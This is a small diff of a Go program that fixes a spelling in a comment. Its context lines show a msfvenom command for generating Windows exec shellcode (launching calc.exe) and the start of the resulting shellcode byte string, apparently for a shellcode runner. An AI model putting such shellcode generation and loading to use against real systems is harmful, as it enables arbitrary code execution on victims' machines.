@@ -31,7 +31,7 @@ func main() {
 	}
 
 	//msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python -v payload
-	//You have to remobe the b before " as you see bellow.
+	//You have to remobe the b before " as you see rigt bellow.
 
 	payload := "\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
 	payload += "\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
